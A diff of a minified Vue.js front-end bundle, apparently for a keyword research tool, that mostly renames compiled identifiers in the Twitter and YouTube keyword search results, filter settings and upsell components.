-                [B, e.summaries && e.summaries.total_keywords > 0 && !e.summaries.hide]
-            ]), S("div", rK, [E(W, {
+                [L, e.summaries && e.summaries.total_keywords > 0 && !e.summaries.hide]
+            ]), S("div", rR, [E(J, {
                 loading: e.loading,
                 has_keywords: e.has_keywords,
                 has_metrics: e.has_metrics
             }, {
-                wrapper: C((() => [E(J, {
+                wrapper: C((() => [E(K, {
                     device_breakdown_data: e.device_breakdown_data,
                     loading: e.loading,
                     current_tab: e.current_tab,
@@ -23580,7 +23602,7 @@ const oK = Ue({
                 has_keywords: e.has_keywords,
                 has_metrics: e.has_metrics
             }, {
-                message: C((() => [7 == e.current_tab ? (b(), g("h4", sK, v(e.trans.get("Sorry, Twitter does not provide any hashtags for your query")), 1)) : (b(), g("h4", aK, v(e.trans.get("Sorry, Twitter does not provide any keyword suggestions for your query")), 1))])),
+                message: C((() => [7 == e.current_tab ? (b(), g("h4", sR, v(e.trans.get("Sorry, Twitter does not provide any hashtags for your query")), 1)) : (b(), g("h4", aR, v(e.trans.get("Sorry, Twitter does not provide any keyword suggestions for your query")), 1))])),
                 _: 1
             }, 8, ["loading", "has_all_error", "has_error", "has_keywords", "has_metrics"]), E(Y, {
                 onMore: e.more,
@@ -23620,13 +23642,13 @@ const oK = Ue({
             }, 8, ["loading", "all_keywords", "total_keywords", "selected", "allow_keyword_basket", "has_error", "has_all_error"])])
         }]
     ]),
-    iK = {
+    iR = {
         class: "row g-0 me-lg-n1px"
     },
-    nK = {
+    nR = {
         class: "col col-md-12 my-1 me-lg-n1px"
     };
-const lK = Ue({
+const lR = Ue({
         mixins: [AT],
         components: {},
         data: () => ({
@@ -23639,7 +23661,7 @@ const lK = Ue({
     }, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("tom-select");
-            return b(), g("div", iK, [S("div", nK, [E(i, {
+            return b(), g("div", iR, [S("div", nR, [E(i, {
                 disabled: e.loading,
                 id: "keyword_language_" + e.id,
                 options: e.language_options,
@@ -23664,17 +23686,17 @@ const lK = Ue({
             ])])])
         }]
     ]),
-    cK = {
+    cR = {
         class: "row g-0 me-lg-n1px"
     },
-    _K = {
+    _R = {
         class: "col-12 col-md-7 my-1 me-n1px"
     },
-    uK = {
+    uR = {
         class: "col col-md-5 my-1 me-lg-n1px"
     };
-const dK = Ue({
-        mixins: [DT],
+const dR = Ue({
+        mixins: [jT],
         components: {},
         data: () => ({
             languages_url: "/search/keywords/twitter/languages",
@@ -23692,7 +23714,7 @@ const dK = Ue({
     }, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("tom-select");
-            return b(), g("div", cK, [S("div", _K, [E(i, {
+            return b(), g("div", cR, [S("div", _R, [E(i, {
                 disabled: e.loading,
                 id: "country_" + e.id,
                 options: e.locations_options,
@@ -23708,7 +23730,7 @@ const dK = Ue({
                 "onUpdate:modelValue": t[1] || (t[1] = t => e.country = t)
             }, null, 512), [
                 [U, e.country]
-            ])]), S("div", uK, [E(i, {
+            ])]), S("div", uR, [E(i, {
                 disabled: e.loading,
                 id: "language_" + e.id,
                 options: e.language_options,
@@ -23721,35 +23743,35 @@ const dK = Ue({
             }, null, 8, ["disabled", "id", "options", "settings", "model-value", "placeholder"])])])
         }]
     ]),
-    mK = ["value"],
-    hK = ["value"],
-    pK = {
+    mR = ["value"],
+    hR = ["value"],
+    pR = {
         key: 2,
         class: "row"
     },
-    gK = {
+    gR = {
         class: "col-12"
     },
-    yK = {
+    yR = {
         class: "check-search-volume-settings-country mb-3"
     },
-    wK = {
+    wR = {
         class: "form-label check-search-volume-settings-country-label"
     },
-    fK = {
+    fR = {
         key: 3,
         class: "row"
     },
-    bK = {
+    bR = {
         class: "col-12"
     },
-    vK = {
+    vR = {
         class: "check-search-volume-settings-currency mb-3"
     },
-    kK = {
+    kR = {
         class: "form-label check-search-volume-settings-currency-label"
     };
-const xK = Ue({
+const xR = Ue({
         mixins: [IT]
     }, [
         ["render", function(e, t, r, s, a, o) {
@@ -23759,12 +23781,12 @@ const xK = Ue({
                 name: "metrics_country",
                 type: "hidden",
                 value: e.country
-            }, null, 8, mK)) : T("", !0), e.permissions.show_currency_settings ? (b(), g("input", {
+            }, null, 8, mR)) : T("", !0), e.permissions.show_currency_settings ? (b(), g("input", {
                 key: 1,
                 name: "metrics_currency",
                 type: "hidden",
                 value: e.currency
-            }, null, 8, hK)) : T("", !0), e.current_country_list.length && e.permissions.show_search_location_settings ? (b(), g("div", pK, [S("div", gK, [S("div", yK, [S("label", wK, v(e.trans.get("Country")), 1), E(i, {
+            }, null, 8, hR)) : T("", !0), e.current_country_list.length && e.permissions.show_search_location_settings ? (b(), g("div", pR, [S("div", gR, [S("div", yR, [S("label", wR, v(e.trans.get("Country")), 1), E(i, {
                 options: e.current_country_list,
                 settings: e.country_settings,
                 class: "check-search-volume-settings-country-value",
@@ -23772,7 +23794,7 @@ const xK = Ue({
                 "onUpdate:modelValue": t[0] || (t[0] = t => e.current_metrics_country = t),
                 "model-value": e.current_metrics_country,
                 placeholder: e.trans.get("Type a country")
-            }, null, 8, ["options", "settings", "model-value", "placeholder"])])])])) : T("", !0), e.current_currency_list.length && e.permissions.show_currency_settings ? (b(), g("div", fK, [S("div", bK, [S("div", vK, [S("label", kK, v(e.trans.get("Currency")), 1), E(i, {
+            }, null, 8, ["options", "settings", "model-value", "placeholder"])])])])) : T("", !0), e.current_currency_list.length && e.permissions.show_currency_settings ? (b(), g("div", fR, [S("div", bR, [S("div", vR, [S("label", kR, v(e.trans.get("Currency")), 1), E(i, {
                 options: e.current_currency_list,
                 settings: e.currency_settings,
                 class: "check-search-volume-settings-currency-value",
@@ -23783,124 +23805,124 @@ const xK = Ue({
             }, null, 8, ["options", "settings", "model-value", "placeholder"])])])])) : T("", !0)])
         }]
     ]),
-    CK = {
+    CR = {
         class: "search-results-settings my-2"
     },
-    SK = {
+    SR = {
         class: "search-results-settings-display mx-n1"
     },
-    TK = {
+    TR = {
         key: 0,
         class: "row"
     },
-    FK = {
+    FR = {
         class: "col"
     },
-    qK = {
+    qR = {
         class: "search-results-settings-modal-header mb-3 pb-1 border-bottom"
     },
-    EK = {
+    ER = {
         key: 1,
         class: "row"
     },
-    UK = {
+    UR = {
         class: "col-12 col-md-6"
     },
-    MK = {
+    MR = {
         class: "search-results-settings-modal-country mb-3"
     },
-    AK = {
+    AR = {
         class: "form-label search-results-settings-modal-country-label"
     },
-    PK = ["value"],
-    LK = {
+    PR = ["value"],
+    $R = {
         key: 0,
         class: "col-12 col-md-6"
     },
-    BK = {
+    LR = {
         class: "search-results-settings-modal-currency mb-3"
     },
-    $K = {
+    DR = {
         class: "form-label search-results-settings-modal-currency-label"
     },
-    DK = {
+    jR = {
         key: 2,
         class: "row"
     },
-    OK = {
+    OR = {
         key: 0,
         class: "col-12 col-md-6"
     },
-    jK = {
+    WR = {
         key: 1,
         class: "col-12 col-md-6"
     },
-    VK = {
+    VR = {
         class: "row"
     },
-    HK = {
+    HR = {
         class: "col"
     },
-    IK = {
+    IR = {
         class: "search-results-settings-modal-header my-3 pb-1 border-bottom"
     },
-    NK = {
+    NR = {
         key: 1,
         class: "row"
     },
-    RK = {
+    BR = {
         class: "col-12 col-md-6"
     },
-    KK = {
+    RR = {
         class: "col-12 col-md-6"
     },
-    JK = {
+    KR = {
         class: "row"
     },
-    WK = {
+    JR = {
         class: "col-12"
     },
-    zK = {
+    zR = {
         class: "row"
     },
-    YK = {
+    YR = {
         class: "col-12"
     },
-    GK = ["innerHTML"],
-    XK = ["innerHTML"],
-    QK = {
+    GR = ["innerHTML"],
+    XR = ["innerHTML"],
+    QR = {
         class: "search-results-summary card my-4 bg-light"
     },
-    ZK = {
+    ZR = {
         class: "card-body"
     },
-    eJ = ["innerHTML"],
-    tJ = ["innerHTML"],
-    rJ = ["innerHTML"],
-    sJ = {
+    eK = ["innerHTML"],
+    tK = ["innerHTML"],
+    rK = ["innerHTML"],
+    sK = {
         class: "search-results-keywords my-3"
     },
-    aJ = {
+    aK = {
         key: 0,
         class: "mb-4"
     },
-    oJ = {
+    oK = {
         key: 1,
         class: "mb-4"
     },
-    iJ = {
+    iK = {
         key: 2,
         class: "mb-4"
     },
-    nJ = {
+    nK = {
         key: 3,
         class: "mb-4"
     };
-const lJ = Ue({
-        mixins: [mp, ML],
+const lK = Ue({
+        mixins: [mp, M$],
         components: {
             "google-search-volume-summary": zg,
-            "google-search-volume-result": Jx
+            "google-search-volume-result": Kx
         },
         data: () => ({
             show_google_trends_chart: !0
@@ -23996,7 +24018,7 @@ const lJ = Ue({
                         payload: this.sanitizePayload(JSON.stringify(t))
                     }, {
                         headers: l
-                    }), this.has_all_error = n.data.has_all_error, this.has_error = n.data.has_error, this.keywords = n.data.keywords, this.has_keywords = !!this.keywords && this.keywords.length > 0, this.breakdown_url = n.data.breakdown_url ? n.data.breakdown_url : null, this.device_breakdown_url = n.data.device_breakdown_url ? n.data.device_breakdown_url : null, this.keywords_payload = n.data.keywords_payload, this.metrics_url = n.data.metrics_url, this.current_scrape_urls = n.data.scrape_urls, await this.metrics(!0), this.inittrends()
+                    }), this.has_all_error = n.data.has_all_error, this.has_error = n.data.has_error, this.keywords = n.data.keywords, this.has_keywords = !!this.keywords && this.keywords.length > 0, this.breakdown_url = n.data.breakdown_url ? n.data.breakdown_url : null, this.device_breakdown_url = n.data.device_breakdown_url ? n.data.device_breakdown_url : null, this.keywords_payload = n.data.keywords_payload, this.metrics_url = n.data.metrics_url, this.current_scrape_urls = n.data.scrape_urls, await this.metrics(!0), this.initTrends()
                 } catch (c) {
                     this.loading = !1, this.has_all_error = !0, this.has_error = !0
                 }
@@ -24025,19 +24047,19 @@ const lJ = Ue({
                 M = k("search-results-settings-modal-search-volume-trend"),
                 A = k("search-results-settings-modal-average-cpc"),
                 P = k("search-results-settings-modal-bing-competition"),
-                L = k("search-results-settings-modal-competition"),
-                $ = k("search-results-settings-filter-positive-keywords"),
-                D = k("search-results-settings-filter-negative-keywords"),
+                $ = k("search-results-settings-modal-competition"),
+                D = k("search-results-settings-filter-positive-keywords"),
+                j = k("search-results-settings-filter-negative-keywords"),
                 O = k("alert-pro-upsell"),
-                j = k("search-results-settings-admin-settings"),
+                W = k("search-results-settings-admin-settings"),
                 V = k("search-results-settings-modal"),
                 H = k("search-results-tabs"),
                 I = k("has-error"),
                 N = k("suggest-page-reload"),
-                R = k("google-search-volume-summary"),
-                K = k("show-upsell"),
-                J = k("google-search-volume-result"),
-                W = k("search-results-table-wrapper"),
+                B = k("google-search-volume-summary"),
+                R = k("show-upsell"),
+                K = k("google-search-volume-result"),
+                J = k("search-results-table-wrapper"),
                 z = k("search-results-no-keyword-found"),
                 Y = k("has-more"),
                 G = k("dropdown-menu-item-add-basket"),
@@ -24050,7 +24072,7 @@ const lJ = Ue({
                 se = k("search-results-actions");
             return b(), g("div", null, [E(i, {
                 loading: e.loading
-            }, null, 8, ["loading"]), S("div", CK, [S("div", SK, [E(n, {
+            }, null, 8, ["loading"]), S("div", CR, [S("div", SR, [E(n, {
                 onClearFilter: e.clearFilter,
                 current_permissions: e.current_permissions,
                 show_current_filter_keyword_result_period: e.show_current_filter_keyword_result_period,
@@ -24102,29 +24124,29 @@ const lJ = Ue({
             }, {
                 content: C((() => [e.current_permissions.show_search_volume_data ? (b(), g(y, {
                     key: 0
-                }, [e.current_permissions.show_currency_settings ? (b(), g("div", TK, [S("div", FK, [S("h5", qK, v(e.trans.get("Search Volume Settings")), 1)])])) : T("", !0), 4 == e.current_tab ? (b(), g("div", EK, [S("div", UK, [S("div", MK, [S("label", AK, v(e.trans.get("Country")), 1), S("input", {
+                }, [e.current_permissions.show_currency_settings ? (b(), g("div", TR, [S("div", FR, [S("h5", qR, v(e.trans.get("Search Volume Settings")), 1)])])) : T("", !0), 4 == e.current_tab ? (b(), g("div", ER, [S("div", UR, [S("div", MR, [S("label", AR, v(e.trans.get("Country")), 1), S("input", {
                     disabled: "disabled",
                     class: "form-control",
                     type: "text",
                     value: e.selected_country_language_name
-                }, null, 8, PK)])]), e.current_permissions.show_currency_settings ? (b(), g("div", LK, [S("div", BK, [S("label", $K, v(e.trans.get("Currency")), 1), E(w, {
+                }, null, 8, PR)])]), e.current_permissions.show_currency_settings ? (b(), g("div", $R, [S("div", LR, [S("label", DR, v(e.trans.get("Currency")), 1), E(w, {
                     id: "metrics_currency_selection",
                     class: "search-results-settings-modal-currency-value",
                     "model-value": e.current_metrics_currency,
                     options: e.current_currency_list,
                     settings: {},
                     disabled: 4 == e.current_tab
-                }, null, 8, ["model-value", "options", "disabled"])])])) : T("", !0)])) : (b(), g("div", DK, [e.current_metrics_is_estimated ? T("", !0) : (b(), g("div", OK, [E(f, {
+                }, null, 8, ["model-value", "options", "disabled"])])])) : T("", !0)])) : (b(), g("div", jR, [e.current_metrics_is_estimated ? T("", !0) : (b(), g("div", OR, [E(f, {
                     current_network_list: e.current_network_list,
                     current_metrics_network: e.current_metrics_network,
                     "onUpdate:current_metrics_network": t[0] || (t[0] = t => e.current_metrics_network = t),
                     disabled: 4 == e.current_tab
-                }, null, 8, ["current_network_list", "current_metrics_network", "disabled"])])), e.current_permissions.show_currency_settings ? (b(), g("div", jK, [E(q, {
+                }, null, 8, ["current_network_list", "current_metrics_network", "disabled"])])), e.current_permissions.show_currency_settings ? (b(), g("div", WR, [E(q, {
                     current_currency_list: e.current_currency_list,
                     current_metrics_currency: e.current_metrics_currency,
                     "onUpdate:current_metrics_currency": t[1] || (t[1] = t => e.current_metrics_currency = t),
                     disabled: 4 == e.current_tab
-                }, null, 8, ["current_currency_list", "current_metrics_currency", "disabled"])])) : T("", !0)]))], 64)) : T("", !0), S("div", VK, [S("div", HK, [S("h5", IK, v(e.trans.get("Filter Results")), 1)])]), e.current_permissions.show_search_volume_data || e.current_permissions.show_cpc_data || e.current_permissions.show_competition_data ? (b(), g("div", NK, [S("div", RK, [E(U, {
+                }, null, 8, ["current_currency_list", "current_metrics_currency", "disabled"])])) : T("", !0)]))], 64)) : T("", !0), S("div", VR, [S("div", HR, [S("h5", IR, v(e.trans.get("Filter Results")), 1)])]), e.current_permissions.show_search_volume_data || e.current_permissions.show_cpc_data || e.current_permissions.show_competition_data ? (b(), g("div", NR, [S("div", BR, [E(U, {
                     current_permissions: e.current_permissions,
                     search_volume_format: e.search_volume_format,
                     error_fields: e.error_fields,
@@ -24140,7 +24162,7 @@ const lJ = Ue({
                     "onUpdate:current_filter_search_volume_trend_min": t[4] || (t[4] = t => e.current_filter_search_volume_trend_min = t),
                     current_filter_search_volume_trend_max: e.current_filter_search_volume_trend_max,
                     "onUpdate:current_filter_search_volume_trend_max": t[5] || (t[5] = t => e.current_filter_search_volume_trend_max = t)
-                }, null, 8, ["current_permissions", "search_volume_trend_format", "error_fields", "current_filter_search_volume_trend_min", "current_filter_search_volume_trend_max"])]), S("div", KK, [E(A, {
+                }, null, 8, ["current_permissions", "search_volume_trend_format", "error_fields", "current_filter_search_volume_trend_min", "current_filter_search_volume_trend_max"])]), S("div", RR, [E(A, {
                     current_permissions: e.current_permissions,
                     average_cpc_format: e.average_cpc_format,
                     error_fields: e.error_fields,
@@ -24153,7 +24175,7 @@ const lJ = Ue({
                     current_permissions: e.current_permissions,
                     current_filter_competition: e.current_filter_competition,
                     "onUpdate:current_filter_competition": t[8] || (t[8] = t => e.current_filter_competition = t)
-                }, null, 8, ["current_permissions", "current_filter_competition"])) : (b(), x(L, {
+                }, null, 8, ["current_permissions", "current_filter_competition"])) : (b(), x($, {
                     key: 1,
                     current_permissions: e.current_permissions,
                     competition_format: e.competition_format,
@@ -24162,7 +24184,7 @@ const lJ = Ue({
                     "onUpdate:current_filter_competition_min": t[9] || (t[9] = t => e.current_filter_competition_min = t),
                     current_filter_competition_max: e.current_filter_competition_max,
                     "onUpdate:current_filter_competition_max": t[10] || (t[10] = t => e.current_filter_competition_max = t)
-                }, null, 8, ["current_permissions", "competition_format", "error_fields", "current_filter_competition_min", "current_filter_competition_max"]))])])) : T("", !0), S("div", JK, [S("div", WK, [E($, {
+                }, null, 8, ["current_permissions", "competition_format", "error_fields", "current_filter_competition_min", "current_filter_competition_max"]))])])) : T("", !0), S("div", KR, [S("div", JR, [E(D, {
                     onCheckFilterKeywordDuplicate: e.checkFilterKeywordDuplicate,
                     current_remain_filter_keywords: e.current_remain_filter_keywords,
                     error_fields: e.error_fields,
@@ -24171,7 +24193,7 @@ const lJ = Ue({
                     "onUpdate:current_filter_keywords": t[11] || (t[11] = t => e.current_filter_keywords = t),
                     current_filter_keywords_partial_match: e.current_filter_keywords_partial_match,
                     "onUpdate:current_filter_keywords_partial_match": t[12] || (t[12] = t => e.current_filter_keywords_partial_match = t)
-                }, null, 8, ["onCheckFilterKeywordDuplicate", "current_remain_filter_keywords", "error_fields", "allow_partial_match", "current_filter_keywords", "current_filter_keywords_partial_match"])])]), S("div", zK, [S("div", YK, [E(D, {
+                }, null, 8, ["onCheckFilterKeywordDuplicate", "current_remain_filter_keywords", "error_fields", "allow_partial_match", "current_filter_keywords", "current_filter_keywords_partial_match"])])]), S("div", zR, [S("div", YR, [E(j, {
                     onCheckDuplicate: e.checkDuplicate,
                     current_remain_negative_keywords: e.current_remain_negative_keywords,
                     error_fields: e.error_fields,
@@ -24185,14 +24207,14 @@ const lJ = Ue({
                         innerHTML: e.trans.get("Need to add more than :count_free negative keywords?", {
                             count_free: 5
                         })
-                    }, null, 8, GK)])),
+                    }, null, 8, GR)])),
                     linktext: C((() => [S("span", {
                         innerHTML: e.trans.get("Try Keyword Tool Pro to use up to :count_pro negative keywords for every search!", {
                             count_pro: "2,000"
                         })
-                    }, null, 8, XK)])),
+                    }, null, 8, XR)])),
                     _: 1
-                }, 8, ["current_permissions", "routes"]), E(j, {
+                }, 8, ["current_permissions", "routes"]), E(W, {
                     current_permissions: e.current_permissions,
                     current_filter_keyword_result_period: e.current_filter_keyword_result_period,
                     "onUpdate:current_filter_keyword_result_period": t[14] || (t[14] = t => e.current_filter_keyword_result_period = t),
@@ -24217,7 +24239,7 @@ const lJ = Ue({
                 current_tab: e.current_tab
             }, null, 8, ["user_is_paid", "has_metrics", "onFetch", "current_tab"])), E(N, {
                 suggest_page_reload: e.suggest_page_reload
-            }, null, 8, ["suggest_page_reload"]), F(S("div", QK, [S("div", ZK, [E(R, {
+            }, null, 8, ["suggest_page_reload"]), F(S("div", QR, [S("div", ZR, [E(B, {
                 loading: e.loading,
                 current_tab: e.current_tab,
                 show_google_trends_chart: a.show_google_trends_chart,
@@ -24227,7 +24249,7 @@ const lJ = Ue({
                 inittrends: e.inittrends,
                 current_permissions: e.current_permissions,
                 current_metrics_currency: e.current_metrics_currency
-            }, null, 8, ["loading", "current_tab", "show_google_trends_chart", "summaries", "pie_summaries", "show_pie_chart", "inittrends", "current_permissions", "current_metrics_currency"]), !o.show_upsell || 1 != e.current_tab && 6 != e.current_tab && 3 != e.current_tab && 7 != e.current_tab ? T("", !0) : (b(), x(K, {
+            }, null, 8, ["loading", "current_tab", "show_google_trends_chart", "summaries", "pie_summaries", "show_pie_chart", "inittrends", "current_permissions", "current_metrics_currency"]), !o.show_upsell || 1 != e.current_tab && 6 != e.current_tab && 3 != e.current_tab && 7 != e.current_tab ? T("", !0) : (b(), x(R, {
                 key: 0,
                 routes: e.routes,
                 selected_language_name: e.selected_language_name
@@ -24235,21 +24257,21 @@ const lJ = Ue({
                 lead: C((() => [S("p", {
                     class: "mb-0",
                     innerHTML: e.trans.get("Want More YouTube Views?")
-                }, null, 8, eJ), S("p", {
+                }, null, 8, eK), S("p", {
                     innerHTML: e.trans.get("Use Keyword Tool Pro To Find The Most Popular YouTube Keywords!")
-                }, null, 8, tJ)])),
+                }, null, 8, tK)])),
                 noopener: C((() => [S("span", {
                     innerHTML: e.trans.get("Subscribe to Keyword Tool Pro Now!")
-                }, null, 8, rJ)])),
+                }, null, 8, rK)])),
                 _: 1
             }, 8, ["routes", "selected_language_name"]))])], 512), [
-                [B, e.summaries && e.summaries.total_keywords > 0 && !e.summaries.hide]
-            ]), S("div", sJ, [E(W, {
+                [L, e.summaries && e.summaries.total_keywords > 0 && !e.summaries.hide]
+            ]), S("div", sK, [E(J, {
                 loading: e.loading,
                 has_keywords: e.has_keywords,
                 has_metrics: e.has_metrics
             }, {
-                wrapper: C((() => [E(J, {
+                wrapper: C((() => [E(K, {
                     device_breakdown_data: e.device_breakdown_data,
                     loading: e.loading,
                     current_tab: e.current_tab,
@@ -24286,7 +24308,7 @@ const lJ = Ue({
                 has_keywords: e.has_keywords,
                 has_metrics: e.has_metrics
             }, {
-                message: C((() => [3 == e.current_tab ? (b(), g("h4", aJ, v(e.trans.get("Sorry, YouTube does not provide any questions for your query")), 1)) : 6 == e.current_tab ? (b(), g("h4", oJ, v(e.trans.get("Sorry, YouTube does not provide any prepositions for your query")), 1)) : 7 == e.current_tab ? (b(), g("h4", iJ, v(e.trans.get("Sorry, YouTube does not provide any hashtags for your query")), 1)) : (b(), g("h4", nJ, v(e.trans.get("Sorry, YouTube does not provide any keyword suggestions for your query")), 1))])),
+                message: C((() => [3 == e.current_tab ? (b(), g("h4", aK, v(e.trans.get("Sorry, YouTube does not provide any questions for your query")), 1)) : 6 == e.current_tab ? (b(), g("h4", oK, v(e.trans.get("Sorry, YouTube does not provide any prepositions for your query")), 1)) : 7 == e.current_tab ? (b(), g("h4", iK, v(e.trans.get("Sorry, YouTube does not provide any hashtags for your query")), 1)) : (b(), g("h4", nK, v(e.trans.get("Sorry, YouTube does not provide any keyword suggestions for your query")), 1))])),
                 _: 1
             }, 8, ["loading", "has_all_error", "has_error", "has_keywords", "has_metrics"]), E(Y, {
                 onMore: e.more,
@@ -24326,13 +24348,13 @@ const lJ = Ue({
             }, 8, ["loading", "all_keywords", "total_keywords", "selected", "allow_keyword_basket", "has_error", "has_all_error"])])
         }]
     ]),
-    cJ = {
+    cK = {
         class: "row g-0 me-lg-n1px"
     },
-    _J = {
+    _K = {
         class: "col col-md-12 my-1 me-lg-n1px"
     };
-const uJ = Ue({
+const uK = Ue({
         mixins: [AT],
         components: {},
         data: () => ({
@@ -24345,7 +24367,7 @@ const uJ = Ue({
     }, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("tom-select");
-            return b(), g("div", cJ, [S("div", _J, [E(i, {
+            return b(), g("div", cK, [S("div", _K, [E(i, {
                 disabled: e.loading,
                 id: "keyword_language_" + e.id,
                 options: e.language_options,
@@ -24370,17 +24392,17 @@ const uJ = Ue({
             ])])])
         }]
     ]),
-    dJ = {
+    dK = {
         class: "row g-0 me-lg-n1px"
     },
-    mJ = {
+    mK = {
         class: "col-12 col-md-7 my-1 me-n1px"
     },
-    hJ = {
+    hK = {
         class: "col col-md-5 my-1 me-lg-n1px"
     };
-const pJ = Ue({
-        mixins: [DT],
+const pK = Ue({
+        mixins: [jT],
         components: {},
         data: () => ({
             languages_url: "/search/keywords/youtube/languages",
@@ -24398,7 +24420,7 @@ const pJ = Ue({
     }, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("tom-select");
-            return b(), g("div", dJ, [S("div", mJ, [E(i, {
+            return b(), g("div", dK, [S("div", mK, [E(i, {
                 disabled: e.loading,
                 id: "country_" + e.id,
                 options: e.locations_options,
@@ -24414,7 +24436,7 @@ const pJ = Ue({
                 "onUpdate:modelValue": t[1] || (t[1] = t => e.country = t)
             }, null, 512), [
                 [U, e.country]
-            ])]), S("div", hJ, [E(i, {
+            ])]), S("div", hK, [E(i, {
                 disabled: e.loading,
                 id: "language_" + e.id,
                 options: e.language_options,
@@ -24427,35 +24449,35 @@ const pJ = Ue({
             }, null, 8, ["disabled", "id", "options", "settings", "model-value", "placeholder"])])])
         }]
     ]),
-    gJ = ["value"],
-    yJ = ["value"],
-    wJ = {
+    gK = ["value"],
+    yK = ["value"],
+    wK = {
         key: 2,
         class: "row"
     },
-    fJ = {
+    fK = {
         class: "col-12"
     },
-    bJ = {
+    bK = {
         class: "check-search-volume-settings-country mb-3"
     },
-    vJ = {
+    vK = {
         class: "form-label check-search-volume-settings-country-label"
     },
-    kJ = {
+    kK = {
         key: 3,
         class: "row"
     },
-    xJ = {
+    xK = {
         class: "col-12"
     },
-    CJ = {
+    CK = {
         class: "check-search-volume-settings-currency mb-3"
     },
-    SJ = {
+    SK = {
         class: "form-label check-search-volume-settings-currency-label"
     };
-const TJ = Ue({
+const TK = Ue({
     mixins: [IT]
 }, [
     ["render", function(e, t, r, s, a, o) {
@@ -24465,12 +24487,12 @@ const TJ = Ue({
             name: "metrics_country",
             type: "hidden",
             value: e.country
-        }, null, 8, gJ)) : T("", !0), e.permissions.show_currency_settings ? (b(), g("input", {
+        }, null, 8, gK)) : T("", !0), e.permissions.show_currency_settings ? (b(), g("input", {
             key: 1,
             name: "metrics_currency",
             type: "hidden",
             value: e.currency
-        }, null, 8, yJ)) : T("", !0), e.current_country_list.length && e.permissions.show_search_location_settings ? (b(), g("div", wJ, [S("div", fJ, [S("div", bJ, [S("label", vJ, v(e.trans.get("Country")), 1), E(i, {
+        }, null, 8, yK)) : T("", !0), e.current_country_list.length && e.permissions.show_search_location_settings ? (b(), g("div", wK, [S("div", fK, [S("div", bK, [S("label", vK, v(e.trans.get("Country")), 1), E(i, {
             options: e.current_country_list,
             settings: e.country_settings,
             class: "check-search-volume-settings-country-value",
@@ -24478,7 +24500,7 @@ const TJ = Ue({
             "onUpdate:modelValue": t[0] || (t[0] = t => e.current_metrics_country = t),
             "model-value": e.current_metrics_country,
             placeholder: e.trans.get("Type a country")
-        }, null, 8, ["options", "settings", "model-value", "placeholder"])])])])) : T("", !0), e.current_currency_list.length && e.permissions.show_currency_settings ? (b(), g("div", kJ, [S("div", xJ, [S("div", CJ, [S("label", SJ, v(e.trans.get("Currency")), 1), E(i, {
+        }, null, 8, ["options", "settings", "model-value", "placeholder"])])])])) : T("", !0), e.current_currency_list.length && e.permissions.show_currency_settings ? (b(), g("div", kK, [S("div", xK, [S("div", CK, [S("label", SK, v(e.trans.get("Currency")), 1), E(i, {
             options: e.current_currency_list,
             settings: e.currency_settings,
             class: "check-search-volume-settings-currency-value",
@@ -24489,7 +24511,7 @@ const TJ = Ue({
         }, null, 8, ["options", "settings", "model-value", "placeholder"])])])])) : T("", !0)])
     }]
 ]);
-const FJ = Ue({
+const FK = Ue({
         mixins: [_p],
         components: {},
         props: ["preoptions"],
@@ -24519,109 +24541,109 @@ const FJ = Ue({
             }, null, 8, ["disabled", "id", "options", "settings", "model-value", "placeholder"])
         }]
     ]),
-    qJ = {
+    qK = {
         class: "search-results-settings my-2"
     },
-    EJ = {
+    EK = {
         class: "search-results-settings-display mx-n1"
     },
-    UJ = {
+    UK = {
         key: 0,
         class: "row"
     },
-    MJ = {
+    MK = {
         class: "col"
     },
-    AJ = {
+    AK = {
         class: "search-results-settings-modal-header mb-3 pb-1 border-bottom"
     },
-    PJ = {
+    PK = {
         key: 1,
         class: "row"
     },
-    LJ = {
+    $K = {
         class: "col-12 col-md-6"
     },
-    BJ = {
+    LK = {
         key: 0,
         class: "search-results-settings-modal-country mb-3"
     },
-    $J = {
+    DK = {
         class: "form-label search-results-settings-modal-country-label"
     },
-    DJ = ["value"],
-    OJ = {
+    jK = ["value"],
+    OK = {
         key: 0,
         class: "col-12 col-md-6"
     },
-    jJ = {
+    WK = {
         class: "search-results-settings-modal-currency mb-3"
     },
-    VJ = {
+    VK = {
         class: "form-label search-results-settings-modal-currency-label"
     },
-    HJ = {
+    HK = {
         key: 2,
         class: "row"
     },
-    IJ = {
+    IK = {
         key: 0,
         class: "col-12 col-md-6"
     },
-    NJ = {
+    NK = {
         key: 1,
         class: "col-12 col-md-6"
     },
-    RJ = {
+    BK = {
         class: "row"
     },
-    KJ = {
+    RK = {
         class: "col"
     },
-    JJ = {
+    KK = {
         class: "search-results-settings-modal-header my-3 pb-1 border-bottom"
     },
-    WJ = {
+    JK = {
         key: 1,
         class: "row"
     },
-    zJ = {
+    zK = {
         class: "col-12 col-md-6"
     },
-    YJ = {
+    YK = {
         class: "col-12 col-md-6"
     },
-    GJ = {
+    GK = {
         class: "row"
     },
-    XJ = {
+    XK = {
         class: "col-12"
     },
-    QJ = {
+    QK = {
         class: "row"
     },
-    ZJ = {
+    ZK = {
         class: "col-12"
     },
-    eW = ["innerHTML"],
-    tW = ["innerHTML"],
-    rW = {
+    eJ = ["innerHTML"],
+    tJ = ["innerHTML"],
+    rJ = {
         class: "search-results-summary card my-4 bg-light"
     },
-    sW = {
+    sJ = {
         class: "card-body"
     },
-    aW = {
+    aJ = {
         class: "search-results-keywords my-3"
     },
-    oW = {
+    oJ = {
         class: "mb-4"
     };
-const iW = Ue({
+const iJ = Ue({
         mixins: [mp],
         components: {
             "google-search-volume-summary": zg,
-            "google-search-volume-result": Jx
+            "google-search-volume-result": Kx
         },
         computed: {
             show_upsell() {
@@ -24676,19 +24698,19 @@ const iW = Ue({
                 M = k("search-results-settings-modal-search-volume-trend"),
                 A = k("search-results-settings-modal-average-cpc"),
                 P = k("search-results-settings-modal-bing-competition"),
-                L = k("search-results-settings-modal-competition"),
-                $ = k("search-results-settings-filter-positive-keywords"),
-                D = k("search-results-settings-filter-negative-keywords"),
+                $ = k("search-results-settings-modal-competition"),
+                D = k("search-results-settings-filter-positive-keywords"),
+                j = k("search-results-settings-filter-negative-keywords"),
                 O = k("alert-pro-upsell"),
-                j = k("search-results-settings-admin-settings"),
+                W = k("search-results-settings-admin-settings"),
                 V = k("search-results-settings-modal"),
                 H = k("search-results-tabs"),
                 I = k("has-error"),
                 N = k("suggest-page-reload"),
-                R = k("google-search-volume-summary"),
-                K = k("show-upsell"),
-                J = k("google-search-volume-result"),
-                W = k("search-results-table-wrapper"),
